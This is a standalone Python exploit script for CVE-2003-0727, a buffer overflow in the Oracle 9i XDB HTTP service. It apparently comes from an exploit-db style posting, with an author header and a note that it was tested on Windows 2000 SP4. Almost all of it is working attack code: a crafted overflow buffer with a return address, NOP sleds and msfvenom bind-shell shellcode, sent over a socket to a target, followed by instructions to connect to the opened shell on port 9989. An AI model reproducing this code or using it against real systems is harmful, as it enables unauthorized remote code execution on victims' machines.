#Exploit Title:Oracle 9i XDB HTTP PASS Buffer Overflow
#Date: 09/25/2017
#Exploit Author: Charles Dardaman
#Twitter: https://twitter.com/CharlesDardaman
#Website: http://www.dardaman.com
#Version:9.2.0.1
#Tested on: Windows 2000 SP4
#CVE: 2003-0727
#This is a modified stand alone exploit of https://www.exploit-db.com/exploits/16809/

#!/usr/bin/python


import socket, sys, base64
import sys
import socket
import time
import socket
from payload import buf
import struct
def shell_attack(target_machine, target_port):

    #usage ./oracle9i_xbd_pass <target ip> <target port>
    try:
        rhost = target_machine #target ip
        rport = target_port#target port

        #Variables:
        ret = b"\x46\x6d\x61\x60" #0x60616d46 Little endian form
        nop = b"\x90"
        pre = b"\x81\xc4\xff\xef\xff\xff\x44" #This has to be prepended into the shellcode.

        #msfvenom -p windows/shell_bind_tcp lport=9989 exitfunc=thread -f py -b "\x00" -e x86/shikata_ga_nai
        #355 bytes
    
        pre += buf


        exploit = b"AAAA:" + b"B"*442 + b"\xeb\x64" + (nop*2) + ret + (nop*266) +b"\xeb\x10" + (nop*109) + buf+ (nop * (400-len(buf)))

    
    

        print ("Attacking " + rhost + ":" + str(rport))

        #Connect to the target
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((rhost,rport))
        #Send exploit
        s.send(exploit)
        s.close()

        print ("Try to connect on port 9989.")
    except:
        print("Not Connected")    